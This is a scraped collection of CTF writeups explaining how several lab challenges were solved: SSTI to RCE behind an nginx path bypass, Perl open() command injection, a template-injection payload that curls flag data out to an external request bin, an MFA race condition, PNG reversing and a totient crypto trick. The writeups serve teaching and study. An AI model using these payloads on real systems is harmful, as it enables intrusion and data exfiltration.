{"url": "https://ctftime.org/writeup/40451", "title": "airspeed", "content": "# WhiteDukesDZ - QnQSec CTF 2025 Writeup: Airspeed Web Challenge\n\n\n![WhiteDukesDZ Logo](\nhttps://raw.githubusercontent.com/S450R1/qnqsec-ctf-writeups/main/web/airspeed/challenge/airspeed-challenge.png\n)\n\n\nWe were also provided with:\n- `docker-compose.yml`\n- `nginx.conf`\n- `src` folder containing the web application source code\n\n\n---\n\n\n## Application Analysis\n\n\nAfter analyzing `nginx.conf`, we can see there is a `/debug` endpoint that is denied. Accessing this endpoint directly results in a 403 status code response (Forbidden).\n\n\n```conf\nlocation = /debug {\n    deny all;\n    return 403;\n}\n```\n\n\nBy analyzing the web application files:\n\n\n- We notice from the Dockerfile that `readflag.c` was compiled and placed in the root directory. Running `/readflag` from the web application container will display the flag.\n\n\n- We notice from `\napp.py\n` that the web application uses the `airspeed` template engine.\n\n\n- Nothing special was found in the other `\napp.py\n` endpoints since there are no user inputs, except for the `/debug` endpoint. When posting a JSON body with `name` set to a `value`, we receive back `Hello, value`:\n \n    ```python\n    @app.route('/debug', methods=['POST'])\n    def debug():\n        name = request.json.get('name', 'World')\n        return airspeed.Template(f\"Hello, {name}\").merge({})\n    ```\n\n\n- We notice from `\napp.py\n` that the Flask server is run with `debug=True`.\n\n\n    ```python\n    if __name__ == '__main__':\n    app.run(host='0.0.0.0', debug=True)\n    ```\n\n\n### Security Observations\n\n\n- While the `/debug` endpoint is denied by the nginx server and returns a 403 response when accessed directly, the web application server (Flask) doesn't block this endpoint at all. For example, with a normal GET request to `/` and a POST request to `/debug` with a JSON body of `name=manini`, this is what actually happens:\n\n\n![WhiteDukesDZ Logo](\nhttps://raw.githubusercontent.com/S450R1/qnqsec-ctf-writeups/main/web/airspeed/demonstration/post-example.png\n)\n\n\n### The Workaround\n\n\nIf we find a way to confuse nginx into treating our endpoint as different from `/debug`, while simultaneously making Flask interpret it as `/debug`, we can successfully access the forbidden endpoint. We'll attempt to find a discrepancy between nginx and Flask by testing all possible bytes after `/debug`. Our request will be to `/debug` + `byte`. To automate this process, we created a Python script. See `solution/\nfind_disrepency.py\n`. (Note that we used `socket` instead of `requests` so our added bytes don't get normalized).\n\n\nAfter running `solution/\nfind_disrepency.py\n`, we got:\n\n\n```bash\n└─$ python3 \nfind_disrepency.py\nBypass found with byte \\x85\n```\n\n\nWhen requesting `/debug\\x85` (at the byte level), nginx sees `/debug\\x85` != `/debug`, but the Flask server interprets `/debug\\x85` == `/debug` and serves the response. Let's test this (see `solution/\nsimple_manini_post.py\n`).\n\n\n```bash\n└─$ python3 \nsimple_manini_post.py\nHTTP/1.1 200 OK\nServer: nginx/1.29.2\nDate: Mon, 20 Oct 2025 16:53:03 GMT\nContent-Type: text/html; charset=utf-8\nContent-Length: 13\nConnection: close\n\n\nHello, manini\n```\nPerfect. Notice that our provided `name=manini` is reflected back.\n\n\n### Exploring Server-Side Template Injection\n\n\nAs mentioned earlier, the web application uses `airspeed` as its template engine. What if we can inject something that gets evaluated instead of just `manini`?\n\n\nAfter reviewing the `airspeed` documentation at \nhttp://velocity.apache.org/engine/1.7/user-guide.html\n, we can try `name=#set( $foo = 7*7 )\\n$foo`. After testing:\n\n\n```bash\n└─$ python3 \nsimple_manini_post.py\nHTTP/1.1 200 OK\nServer: nginx/1.29.2\nDate: Mon, 20 Oct 2025 17:12:34 GMT\nContent-Type: text/html; charset=utf-8\nContent-Length: 9\nConnection: close\n\n\nHello, 49\n```\n\n\nYes! The web application is vulnerable to SSTI. Our `7*7` expression was evaluated to `49`.\n\n\n---\n\n\n## Remote Code Execution\n\n\nTo get the flag, we need to run `/readflag` on the challenge instance. We already know the web application is vulnerable to SSTI, so we need to find a path to remote code execution.\n\n\nUsing `name=#set($s='')#set($base=$s.__class__.__mro__[1])#foreach($sub in $base.__subclasses__())$foreach.index: $sub\\n#end` allows us to list available subclasses with their respective indexes. After execution, we have:\n\n\n```bash\n┌──(s450r1㉿S450R1)-[~/…/qnqsec-ctf-writeups/web/airspeed/solution]\n└─$ python3 \nsimple_manini_post.py\nHTTP/1.1 200 OK\nServer: nginx/1.29.2\nDate: Tue, 21 Oct 2025 00:17:34 GMT\nContent-Type: text/html; charset=utf-8\nContent-Length: 20778\nConnection: close\n\n\nHello, 0: <class 'type'>\n...\n479: <class 'jinja2.utils.Cycler'>\n...\n```\n\n\n## Solution\n\n\nSince `cycler` is available, we can use it to execute commands on the host server using `cycler.__init__.__globals__.os.popen('/readflag').read()`. This can be achieved with a payload like:\n\n\n```json\n{\n    \"name\": \"#set($x='')\\n#set($cycler=$x.__class__.__mro__[1].__subclasses__()[479])\\n#set($init=$cycler.__init__)\\n#set($globals=$init.__globals__)\\n#set($os=$globals.os)\\n#set($popen=$os.popen('/readflag'))\\n$popen.read()\"\n}\n```\n\n\nAfter running `solution/\nexploit.py\n`, we get:\n\n\n```bash\n┌──(s450r1㉿S450R1)-[~/…/qnqsec-ctf-writeups/web/airspeed/solution]\n└─$ python3 \nexploit.py\nHTTP/1.1 200 OK\nServer: nginx/1.29.2\nDate: Tue, 21 Oct 2025 01:18:38 GMT\nContent-Type: text/html; charset=utf-8\nContent-Length: 41\nConnection: close\n\n\nHello, QnQSec{n0w_th1s_1s_th3_r34l_f14g}\n```", "source": "ctftime", "crawled_at": "2025-11-27T18:18:30.054507", "metadata": {"ctf_name": "Upcoming", "challenge": "web", "tags": ["web", "qnqsec", "2025", "ssti", "nginx", "flask", "rce"]}}
{"url": "https://ctftime.org/writeup/40430", "title": "web/ pearl", "content": "## Introduction\n\n\nThe **“pearl”** challenge is about abusing **Perl’s two-argument `open`** on **unsanitized user input**, which silently enables **pipe opens (command execution)** when the filename ends with a `|`. The server also **URL-decodes** the path, so we can inject a newline and arguments. A partial blacklist misses this single trailing pipe case, letting us execute `cat /flag*` and read the flag.\n\n\n### Context Explanation\n\n\n* Tech: custom HTTP server using **`HTTP::Daemon`** (Perl), serving files from `./files` (see [`\nserver.pl\n`](\nhttps://github.com/HiitCat/CTF-Sources/blob/main/2025/ImaginaryCTF%202025/Web/pearl/src/server.pl\n)).\n* Entry point: **request path** (after URL decoding) is used to build a filesystem path, then passed to **two-arg `open`**.\n* “Sanitization”: a **blacklist regex** tries to block `..`, some shell metacharacters, and `|.*|`, but **does not** block a **single trailing `|`** and **does not** block **newlines**.\n* Flag: built at container start (`flag.txt` moved/renamed to `/flag-<md5>.txt`), so `/flag*` reliably matches.\n\n\n```docker\nRUN mv /flag.txt /flag-$(md5sum /flag.txt | awk '{print $1}').txt\n```\n### Directive\n\n\n1. Craft a request path that, after URL-decoding, injects a **newline** and a **shell command** ending with a **trailing pipe** `|`.\n2. Hit the server with that path so the **two-arg `open`** treats it as a **pipe open** and executes our command.\n3. Use a **glob** `/flag*` to catch the randomized flag filename and read it.\n\n\n---\n\n\n## Solution\n\n\n### 1) Server behavior & vulnerable code\n\n\nRelevant pieces from [**`\nserver.pl\n`**](\nhttps://github.com/HiitCat/CTF-Sources/blob/main/2025/ImaginaryCTF%202025/Web/pearl/src/server.pl):\n\n\n```perl\nmy $webroot = \"./files\";\n...\nwhile (my $r = $c->get_request) {\n  if ($r->method eq 'GET') {\n    my $path = CGI::unescape($r->uri->path);   # URL-decodes (%0A => newline)\n    $path =~ s|^/||;\n    $path ||= 'index.html';\n\n\n    my $fullpath = File::Spec->catfile($webroot, $path);\n\n\n    # Partial blacklist — note it only bans a pipe WHEN followed by ... another pipe\n    if ($fullpath =~ /\\.\\.|[,\\`\\)\\(;&]|\\|.*\\|/) {\n      $c->send_error(RC_BAD_REQUEST, \"Invalid path\");\n      next;\n    }\n    ...\n    # Serve file\n    open(my $fh, $fullpath) or do {            # <-- two-arg open on untrusted string\n      $c->send_error(RC_INTERNAL_SERVER_ERROR, \"Could not open file.\");\n      next;\n    };\n    binmode $fh;\n    my $content = do { local $/; <$fh> };\n    close $fh;\n    ...\n```\n\n\nKey points:\n\n\n* **`CGI::unescape`** decodes `%0A` to a **literal newline** inside `$path`.\n* The regex **does not** forbid a **single trailing `|`**; it only matches `\\|.*\\|` (a pipe, some stuff, then another pipe).\n* **Two-argument `open`** on a string that **ends with `|`** turns into a **pipe read** from the preceding shell command (Perl feature).\n  → If `$fullpath` becomes e.g. `\"./files/x\\ncat /flag*|\"`, Perl executes **`cat /flag*`** and pipes its output into `$fh`.\n\n\n> \\[Screenshot: `\nserver.pl\n` showing the blacklist line and the `open(my $fh, $fullpath)` call]\n\n\nAlso from [**`Dockerfile`**](\nhttps://github.com/HiitCat/CTF-Sources/blob/main/2025/ImaginaryCTF%202025/Web/pearl/src/Dockerfile):\n\n\n```dockerfile\nCOPY flag.txt /\nRUN mv /flag.txt /flag-$(md5sum /flag.txt | awk '{print $1}').txt\n```\n\n\nThis is why `/flag*` is a reliable glob target for the flag.\n\n\n---\n\n\n### 2) PoC request (as provided) — newline + trailing pipe\n\n\nThe provided PoC (**`pearl/poc/pearl.txt`**) sends a raw HTTP request:\n\n\n```http\nGET /x%0Acat%20/flag*%7C HTTP/1.1\nHost: \npearl.chal.imaginaryctf.org\nConnection: keep-alive\n```\n\n\nURL-decoded path becomes:\n\n\n```\n/x\ncat /flag*|\n```\n\n\n* Line 1 is a **dummy filename** under `./files/` (likely non-existent).\n* Line 2 is the **shell command** we want the Perl `open` to execute (because it **ends with `|`**).\n* Net effect: two-arg `open` treats `$fullpath` as a **pipe**, runs `cat /flag*`, and returns the flag content.\n\n\n![Flag](\nhttps://blog.hitc.at/images/imaginaryctf2025/web/pearl_flag.png\n)\n\n\n---\n\n\n### 3) Why it works (concise)\n\n\n* **Two-arg `open`** on an **untrusted scalar** enables **special modes**: a trailing `|` is a **pipe open** (command execution).\n* The **blacklist** misses the **single trailing `|`** pattern and **doesn’t strip newlines**, letting us **smuggle a separate shell command** after a filename.\n* `CGI::unescape` ensures `%0A` becomes a **real newline** inside the “filename.”\n* `/flag*` matches the randomized flag file produced at container startup.", "source": "ctftime", "crawled_at": "2025-11-27T18:18:54.749567", "metadata": {"ctf_name": "Upcoming", "challenge": "perl", "tags": ["perl", "web", "command_injection"]}}
{"url": "https://ctftime.org/writeup/40438", "title": "portable-graphics", "content": "# portable-graphics\n\n\n![Proof](proof.png)   \n![blood](blood.png)\n\n\n**Author:** `thek0der`  \n**Solves:** 5\n\n\n**writeup made by** `lifip27`\n---\n\n\n## Description\n\n\nWe love our graphics to be portable! If you can abide our rules, we might give you the flag...   \n\n\nWe get THE `challenge` BINARY\n---\n\n\n## Recon (yet again)\n\n\nWe start by opening ida and importing the binary!\n\n\nI recommend when doing reverse sometimes to filter the functions that are related to `main`!   \nFor example:\n\n\n![main](main.png)\n\n\nLets start looking at main!\n\n\nWe can find this!   \n\n\n```c\nmain_readExactly(*(io_Reader_0 *)v50, *(int *)&v50[16]);\n  if ( v5 )\n  {\n    v6 = 0;\n  }\n  else\n  {\n    if ( v4 == main_pngSig.len )\n      runtime_memequal();\n    else\n      v7 = 0;\n    v6 = v7 != 0LL;\n  }\n  v50[69] = v6;\n```\n\n\nThis means that some PNG signature must match\nlets try to connect to the server\nIm just gonna use a test.png photo dosent really matter\n```bash\n$ nc -q 1 \nctf.ac.upt.ro\n 9330 < test.png\nPlease upload your file (raw):\nNope!\n```\n\n\n## Solve\n\n\nLet's look inside the code to see what kind of png does it want!\nWe can fine some interesting stuff like:\n\n\nthe IHDR parsing block:\n```c\nelse if ( v26 == 72 && v68[6] == 68LL && v68[7] == 82LL ) // 'IDHR'\n      {\n        if ( v22 )\n          v25 = 0LL; // invalidate if IHDR not first\n          ...\n          v66 = 1;\n          if ( *(unsigned int *)&v50[72] == 1337LL && *(unsigned int *)&v50[76] == 1LL && v50[80] == 8LL )\n            v39 = v50[68];\n          else\n            v39 = 0;\n          if ( v50[81] != 2LL && v50[81] != 6LL )\n            v39 = 0;\n          if ( v50[82] || v50[83] || v50[84] )\n            v39 = 0;\n        }\n```\n\n\n**If you want more details about IHDR check out this page \nhttps://www.libpng.org/pub/png/spec/1.2/PNG-Chunks.html**\nThis tells us the IHDR chunk must be the very first one!   \nScrolling down we can find each test!\n\n\n![idhr](idhr.png)\n\n\nWhich means:\n```bash\nWidth = 1337\nHeight = 1\nBit depth = 8\nColor type = 2 (RGB) or 6 (RGBA)\nCompression, filter, interlace = 0\n```\n\n\nStill in `main.main` we can find this\n\n\n![ong](png.png)\n\n\nWhich means:\nWe must include at least one IDAT.\nWe must include an IEND chunk.\nAfter IEND there can be no trailing bytes.\n\n\nAfter searching around we find this calls:   \n![tEXt](tEXt.png)\n\n\nAnd going in `main.parseTEXTPass` we can clearly see the bytes:\n\n\n![1](1.png)\n\n\nreadable:\n```c\nif ( v17 == 15 )\n{\n  la  a1, \"6ee494848e978ea\"\n  li  a2, 0Fh\n  jal runtime_memequal\n}\n...\nif ( v6 == 17 )\n{\n  la  a1, \"d50bc687e6e14f8f8\"\n  li  a2, 11h\n  jal runtime_memequal\n}\n```\n\n\nSo The `tEXt` payload must be:\n```bash\n\"6ee494848e978ea\" + \\x00 + \"d50bc687e6e14f8f8\"\n```\n\n\nAfter this we need to find the raRE chunk!   \n \n![rare](raRE.png)\n\n\nPressing tab to see the value is:\n\n\n![2](2.png)\n\n\nReadable:\n```c\nla  a1, \"2b6b2c6ba2912d219d\"\nli  a2, 12h    # 18\n```\n\n\nWe must include a custom chunk `raRE` with exactly 18 bytes, and the payload must equal `\"2b6b2c6ba2912d219d\"`.\n\n\nAnd now using the `\nsolve.py\n` to create the PNG with the constant values we can grab the flag!\n\n\n```bash\n$ python3 \nmakepng.py\nbuilt pass.png\n```\n\n\n```bash\n$ nc -q 1 \nctf.ac.upt.ro\n 9330 < pass.png\nPlease upload your file (raw):\nctf{4519435858447654fa9eb22e9aa1f916c7a9e35873ac062b849acde073f71e2b}\n```\n\n\nThere is our flag!\n\n\n### Flag: ctf{4519435858447654fa9eb22e9aa1f916c7a9e35873ac062b849acde073f71e2b}", "source": "ctftime", "crawled_at": "2025-11-27T18:19:01.074635", "metadata": {"ctf_name": "Upcoming"}}
{"url": "https://ctftime.org/writeup/40422", "title": "Temptation", "content": "## Introduction\n\n\n### Context Explanation\nThe \"Temptation\" challenge is a web application security exercise focusing on template injection vulnerabilities in Python web applications.\n\n\n![Temptation home](\nhttps://blog.hitc.at/images/nullcon/web/temptation_home.png\n)\n\n\n### Directive\nThe goal is to retrieve a flag by exploiting vulnerabilities in the web application.\n\n\n## Solution\n\n\n### Analyzing source code\nFirst, we need to retrieve the application's source code. The webpage contains a hidden comment suggesting to look at `/?source`.\n\n\n```html\t\n<html>\n    <head>\n            <title>Temptation</title>       \n    </head>\n    <body>\n        <h1>Temptation challenge</h1>\n        <form action=\"/\" method=\"POST\">\n            <table>\n                <tr>\n                    <th>\n                        <label for=\"temptation\">What is your temptation?</label>\n                    </th>\n                    <td>\n                        <input id=\"temptation\" name=\"temptation\" type=\"password\"/>\n                    </td>\n                </tr>\n                <tr>\n                    <th>\n                        <label for=\"submit\"></label>\n                    </th>\n                    <td>\n                        <button id=\"submit\" name=\"submit\">submit</button>\n                    </td>\n                </tr>\n            </table>\n        </form>\n \n    </body>\n</html>\n```\n\n\nHowever, directly accessing this path doesn't reveal anything.\nAfter testing different inputs, we discover that adding any parameter value (e.g., `/?source=anything`) reveals the source code.\n\n\n```python\n\n\nimport web\nfrom web import form\nweb.config.debug = False\nurls = (\n  '/', 'index'\n)\napp = web.application(urls, locals())\nrender = web.template.render('templates/')\nFLAG = open(\"/tmp/flag.txt\").read()\n\n\ntemptation_Form = form.Form(\n    form.Password(\"temptation\", description=\"What is your temptation?\"),\n    form.Button(\"submit\", type=\"submit\", description=\"Submit\")\n)\n\n\nclass index:\n    def GET(self):\n        try:\n            i = web.input()\n            if i.source:\n                return open(__file__).read()\n        except Exception as e:\n            pass\n        f = temptation_Form()\n        return render.index(f)\n\n\n    def POST(self):\n        f = temptation_Form()\n        if not f.validates():\n            return render.index(f)\n        i = web.input()\n        temptation = i.temptation\n        if 'flag' in temptation.lower():\n            return \"Too tempted!\"\n        try:\n            temptation = web.template.Template(f\"Your temptation is: {temptation}\")()\n        except Exception as  e:\n            return \"Too tempted!\"\n        if str(temptation) == \"FLAG\":\n            return FLAG\n        else:\n            return \"Too tempted!\"\napplication = app.wsgifunc()\nif __name__ == \"__main__\":\n    app.run()\n```\n\n\nThe source code analysis reveals several key points:\n- The application uses the `\nweb.py\n` framework\n- The flag is stored in `/tmp/flag.txt`\n- A form asks for a \"temptation\" input\n- Multiple security checks are implemented:\n\n\n```python\nif 'flag' in temptation.lower():\n    return \"Too tempted!\"\n```\n\n\n```python\nif str(temptation) == \"FLAG\":\n    return FLAG\n```\n\n\nThe interesting part is the template string evaluation using `web.template.Template()` with an f-string, which is vulnerable to Python code injection.\n\n\n```python\ntemptation = web.template.Template(f\"Your temptation is: {temptation}\")()\n```\n\n\n### Exploitation\nThe vulnerability lies in the template processing. While the application prevents using the word `flag` directly and requires the final output to be `FLAG`, we can bypass these restrictions using template injection.\n\n\n1. First, we confirm the vulnerability using a time-based payload:\n```python\n${__import__('os').system('sleep 5')}\n```\n![Confirming 5s sleep](\nhttps://blog.hitc.at/images/nullcon/web/temptation_sleep.png\n)\n\n\n#### Access to the flag\n2. After confirming the RCE capability, we craft a payload to exfiltrate the flag:\n```python\n${__import__('os').system('curl \nhttps://eohs7zi0yztnmqq.m.pipedream.net/$(cat\n /tmp/f*.txt | base64)')}\n```\n\n\nThis payload:\n- Uses `os.system()` to execute shell commands\n- Reads the flag file using `cat` with a wildcard to avoid using \"flag\" in the payload\n- Base64 encodes the content to ensure safe transmission\n- Exfiltrates the data using `curl` to a RequestBin endpoint\n\n\n![Requestbin request received](\nhttps://blog.hitc.at/images/nullcon/web/temptation_requestbin.png\n)\n\n\n3. Decoding the received base64 string:\n```bash\necho 'RU5Pe1QzTV9QbDRUXzNTXzRyM19TM2NVcmUhIX0=' | base64 -d\nENO{T3M_Pl4T_3S_4r3_S3cUre!!}\n```", "source": "ctftime", "crawled_at": "2025-11-27T18:19:04.241298", "metadata": {"ctf_name": "Upcoming", "challenge": "web", "tags": ["web", "template-injection", "python"]}}
{"url": "https://ctftime.org/writeup/40412", "title": "webby", "content": "# WhiteDukesDZ - Nullcon CTF 2025 Writeup: Webby\n\n\n![WhiteDukesDZ Logo](\nhttps://raw.githubusercontent.com/S450R1/nullcon-ctf-writeups/main/web/webby/challenge/web-webby-challenge.png\n)\n\n\n---\n\n\n## Challenge Summary\n\n\nThis challenge presents a Python web application with a `Multi Factor Authentication (MFA)` system. The app allows users to log in with a username and password, and enforces MFA only for the admin user. After a successful login, if MFA is required, the server generates a random token using a combination of bcrypt and MD5 hashing, and expects the user to submit this token to complete authentication.\n\n\n## Application Analysis\n\n\nAfter visiting challenge main page:\n\n\n![WhiteDukesDZ Logo](\nhttps://raw.githubusercontent.com/S450R1/nullcon-ctf-writeups/main/web/webby/demonstration/web-webby-index.png\n)\n\n\nWe notice a login page, when that accessing the page source code (`CTRL + U` in your browser):\n\n\n![WhiteDukesDZ Logo](\nhttps://raw.githubusercontent.com/S450R1/nullcon-ctf-writeups/main/web/webby/demonstration/web-webby-source-code.png\n)\n\n\nWe notice that there is some hardcoded credentials (EX. `admin`:`admin`). Also it is mentioned that we can see the application source code by adding `source` parameter. After visiting `/?source=1` we can get the app code (see `challenge/\napp.py\n`). Before analyzing the `\napp.py\n` code. We tried to login directly using the hardcoded credentials:\n\n\n![WhiteDukesDZ Logo](\nhttps://raw.githubusercontent.com/S450R1/nullcon-ctf-writeups/main/web/webby/demonstration/web-webby-mfa.png\n)\n\n\nIt is mentioned that we need another token (`MFA`) so we can complete our login process.\n\n\nGoing back to the application source code at `challenge/\napp.py\n`, there is four main endpoints:\n\n\n    - `/` it is the main page, it accepts both `GET` and `POST`.\n\n\n        - if `GET`, reads input parameters using `web.input()`. If input contains `source`, it returns the content of the current file `\napp.py\n`. Otherwise it creates the login form and renders it.\n\n\n        - if `POST`: \n \n            - Creates a login form and checks if submitted data is valid, if not it kills the session and re-renders the login page.\n\n\n            - Reads the submitted `username` and `password`. if incorrect, it kills the session and re-renders the login page. Otherwise, it marks the session as logged in and saves the `username`. If the user requires `MFA` (only `admin`), it:\n\n\n                - Sets a session flag for MFA.\n\n\n                - Generates a random MFA token using bcrypt and MD5, stores it in the session.\n\n\n                - Marks the session as not logged in and redirects to the MFA page.\n\n\n            If MFA is not required, it renders the main page for the user.\n\n\n    - `/mfa` handles the Multi Factor Authentication step, accepting both `GET` and `POST`.\n\n\n        - if `GET`, checks if the session flag for MFA `doMFA` is set. If not, redirects to the main page. Otherwise, it creates and renders the MFA token form.\n\n\n        - if `POST`:\n\n\n            - Creates the MFA form and checks if submitted data is valid. If not, re-renders the MFA form.\n\n\n            - Reads the submitted token. If the token does not match the one stored in the session `tokenMFA`, redirects to the logout page.\n\n\n            - If the token matches, marks the session as logged in and redirects to the `/flag` page.\n\n\n    - `/logout`, `GET` only, it kills the session and redirect to login page.\n\n\n    - `/flag` , `GET` only, it checks from session if the user is logged in and its `username = admin`. If not it redirects to the main page. Otherwise it kills the session and shows the flag.\n\n\n### Security Observations\n\n\n- When logging in, after the credentials check, the session is set to `session.loggedIn=True` before the `check_mfa` step. This means that even for users who require `MFA` (like `admin`), the session is briefly marked as logged in before `check_mfa` resets `session.loggedIn` to `False`. Because generating the MFA token (`session.tokenMFA = hashlib.md5(bcrypt.hashpw(str(secrets.randbits(random.randint(40,65))).encode(),bcrypt.gensalt(14))).hexdigest()`) can take a short amount of time, this creates a window for a <ins>race condition</ins> exploit: an attacker could potentially access endpoints that require `loggedIn=True` during this brief period, bypassing MFA.\n\n\n---\n\n\n## Solution\n\n\nTo get the flag, we need to:\n\n\n    - Log in using the `admin` credentials.\n\n\n    - Exploit the brief window between `session.loggedIn=True` and `session.loggedIn=False` (while the MFA token is being generated) to access `/flag` and read the flag before the session is reset.\n\n\nTo reliably perform this race condition attack, we use `Burp Suite Community Edition` to send the login and flag requests in rapid succession over the same connection:\n\n\n- Open `Burp Suite Community Edition` and use the built-in browser to access the challenge instance.\n\n\n![WhiteDukesDZ Logo](\nhttps://raw.githubusercontent.com/S450R1/nullcon-ctf-writeups/main/web/webby/solution/web-webby-burp1.png\n)\n\n\n- Log in with the `admin:admin` credentials.\n\n\n![WhiteDukesDZ Logo](\nhttps://raw.githubusercontent.com/S450R1/nullcon-ctf-writeups/main/web/webby/solution/web-webby-burp2.png\n)\n\n\n- Attempt to access `/flag` (you'll be redirected to the login page), just to capture the flag request in Burp's history.\n\n\n![WhiteDukesDZ Logo](\nhttps://raw.githubusercontent.com/S450R1/nullcon-ctf-writeups/main/web/webby/solution/web-webby-burp3.png\n)\n\n\n- In Burp, go to `Proxy` > `HTTP History`. You should see both the login and flag requests.\n\n\n![WhiteDukesDZ Logo](\nhttps://raw.githubusercontent.com/S450R1/nullcon-ctf-writeups/main/web/webby/solution/web-webby-burp4.png\n)\n\n\n- For each request, right-click and select `Send to repeater`. Then switch to the `Repeater` tab.\n\n\n![WhiteDukesDZ Logo](\nhttps://raw.githubusercontent.com/S450R1/nullcon-ctf-writeups/main/web/webby/solution/web-webby-burp5.png\n)\n\n\n- Ensure the login request tab is before the flag request tab. Group both tabs: right-click a tab, select `Add tab to group` > `Create tab group`, select both tabs, and submit.\n\n\n![WhiteDukesDZ Logo](\nhttps://raw.githubusercontent.com/S450R1/nullcon-ctf-writeups/main/web/webby/solution/web-webby-burp6.png\n)\n\n\n- Click the arrow next to `Send`, then choose `Send group in sequence (single connection)` and click `Send group`.\n\n\n![WhiteDukesDZ Logo](\nhttps://raw.githubusercontent.com/S450R1/nullcon-ctf-writeups/main/web/webby/solution/web-webby-burp7.png\n)\n\n\nIf successful, the flag will be returned:\n\n\n```data\nENO{R4Ces_Ar3_3ver1Wher3_Y3ah!!}\n```", "source": "ctftime", "crawled_at": "2025-11-27T18:19:07.479246", "metadata": {"ctf_name": "Upcoming", "challenge": "python", "tags": ["python", "nullcon", "race-condition", "2025"]}}
{"url": "https://ctftime.org/writeup/40406", "title": "Power tower", "content": "We are given the hex-string of the encrypted flag and the source code showing the method of encryption.\n\n\nThe source code suggests that it calculates `int_key` to be the following \"power-tower\" number of all primes between 1 and 100\n```\n            2\n          3^\n        ...\n      79^  \n    83^\n  89^\n97^\n```\nthen calculates that number modulo the large `n` value, and uses that as the key to AES encrypt the flag.\n\n\nOf coruse in reality the source code could never be ran because the power-tower number is prohibitively large so there must be another way of calculating the key value.\n\n\nTo do so, we can use **Euler's theorem**. Euler's theorem states if positive integers `n` and `a` are coprime then `a ^ phi(n) ≡ 1 mod n` where `phi(n)` is Euler's totient function that counts the number of integers up to `n` that are relatively prime to `n`.\n\n\n`a ^ phi(n) ≡ 1 mod n` helps us because it means that where we want to calculate `a^b mod n` for some large `b`, we can reduce `b`  by noticing we can find the remainder `r` such that `b = k * phi(n) + r`. Then `a^b mod n = a^(k*phi(n)+r) mod n = (a^(k*phi(n)) * a^r) mod n = ((a^phi(n))^k * a^r) mod n ≡ (1^k * a^r) mod n = a^r mod n`.\n\n\nSo that means: `a^b mod n ≡ a^(b mod phi(n)) mod n` when `n` and `a` are coprime.\n\n\nWe can calculate `phi(n)` easily so long as we know the prime factors of `n` due to **Euler's product formula** which states `phi(n) = n * Π((p-1)/p) ` where the product `Π` is over all the distinct prime factors `p` of `n`. \n\n\nWe can do this recursively, first calculating `phi(n)`, then `phi(phi(n))=phi^2(n)`, then `phi(phi(phi(n)))=phi^3(n)` and so on, until we have `3^2 mod phi^23(n) = 9`, then `5 ^ 9 mod phi^22(n) = 1953125` then `7^1953125 mod phi^21(n) = 5272812950246780296288348397180183079852019020305406550894936231` and so on, and because of the reduction the exponents never get larger than `n` (78 digits long) and so remain managable (as compared to the astronomical exponents if we didn't have the modulo helping us!).\n\n\nPutting this all together, here is my solve script.\n\n\n```python\nfrom Crypto.Cipher import AES\nfrom Crypto.Util import number\nfrom functools import reduce\nfrom sympy.ntheory import factorint\n\n\ndef phi(n):\n    print('phi', n)\n    if(n < 0): n = -n\n    if n == 0: return 0\n    if n == 1: return 1\n    if n == 2: return 1\n    factors = list(factorint(n).keys())\n    return (n * reduce(lambda x, y: x * (y - 1), factors, 1)) // reduce(lambda x, y: x * y, factors, 1)\n\n\ndef powertower(primes, n):\n    if len(primes) == 2:\n        result = pow(primes[1], primes[0], n)\n    else:\n        result = pow(primes[-1], powertower(primes[:-1], phi(n)), n)\n    print(result)\n    return result\n\n\n# n = number.getRandomNBitInteger(256)\nn = 107502945843251244337535082460697583639357473016005252008262865481138355040617\n\n\nprimes = [p for p in range(100) if number.isPrime(p)]\n\n\nint_key = powertower(primes, n)\n\n\nkey = int.to_bytes(int_key, 32, byteorder=\"big\")\ncipher = open(\"cipher.txt\", \"r\").read().strip()\nflag = AES.new(key, AES.MODE_ECB).decrypt(bytes.fromhex(cipher))\nprint(flag)\n\n\n###\n# phi 107502945843251244337535082460697583639357473016005252008262865481138355040617\n# phi 106656465954594992227312203077713006587965800635814353306369389060697410445312\n# phi 29970165580857582102036857156579701495531497766270525309534476100493648068608\n# phi 7467242028734943276198998296907123249252251029983571451365420952179651379200\n# phi 1269237825224153827759617570784166477777435105458379290184361960133361664000\n# phi 220856445409942410607579128684927171029818854024203224102779729041424384000\n# phi 38426629583920220737652753398740209611581447743071490944118372004003840000\n# phi 7033802026128398497275908097717361944462431356697231715680342696263680000\n# phi 1398022762957197216849869932465562622501849710647896986967521529692160000\n# phi 277867878351741061734135638750919279006578824476600643372426639441920000\n# phi 57738779917244895944755457402788421611756638852280653168296444559360000\n# phi 13997279979938156592667989673403253724062215479340764404435501711360000\n# phi 3393279995136522810343755072340182720984779510143215613196485263360000\n# phi 822613332154308560083334562991559447511461699428658330471875215360000\n# phi 219363555241148949355555883464415852669723119847642221459166724096000\n# phi 58496948064306386494814902257177560711926165292704592389111126425600\n# phi 15599186150481703065283973935247349523180310744721224637096300380160\n# phi 4159782973461787484075726382732626539514749531925659903225680101376\n# phi 1386594324487262494691908794244208846504916510641886634408560033792\n# phi 462198108162420831563969598081402948834972170213962211469520011264\n# phi 154066036054140277187989866027134316278324056737987403823173337088\n# phi 51355345351380092395996622009044772092774685579329134607724445696\n# phi 17118448450460030798665540669681590697591561859776378202574815232\n# 9\n# 1953125\n# 5272812950246780296288348397180183079852019020305406550894936231\n# 47010857620305641428821871837048895189393315137072666330151357507\n# 259722333789055990984863074249446211700306933924094190538426367381\n# 280488081538048586387160854821443413866080335888230797461843708753\n# 2117777436487693023514994561466359462928276264029062106743943340499\n# 4055374701429556659881928730692702975027409479963256770896199235847\n# 2494791660603823176461789239197686606388257943874153109936981818709\n# 109293035149299131178491179622880387764337473544843328425317239808671\n# 485646265807815932058941708264665358079903968069134159743356742477613\n# 3071327790725066368046470174546108074909747943785779575326206258333321\n# 9614633228612872034289196862990661378595176185597511932800328715732043\n# 37956593305480064971193103074046330400679856772139725919007010147774223\n# 27684929161307053274012908483361155757372617579528119012022484214579677\n# 366948622062393746437974151402630697316787300414654475016659506234327019\n# 6617478545542492438857001916498594802467225186273723309664698942942620741\n# 32216562958346528413035858455059340195584270416024180842887427798476508467\n# 87015953864651184206380145526079325866851497390566579152147588761577053591\n# 300396861982842389028416458101446649414439111464229592512779615343883393977\n# 5343132062847871879579535867063547843873934756634705632585054226177317457359\n# 7390344881272852531101178942674955886694088405617803515427130767230086668699\n# 55319929876539258630362464679588063193920627024882290739430771628945704297737\n# 16347505767151968709743636365502606329879983155171448517653531921243027556968\n# b'ENO{m4th_tr1ck5_c4n_br1ng_s0me_3ffic13ncy}______'\n###\n```", "source": "ctftime", "crawled_at": "2025-11-27T18:19:22.694440", 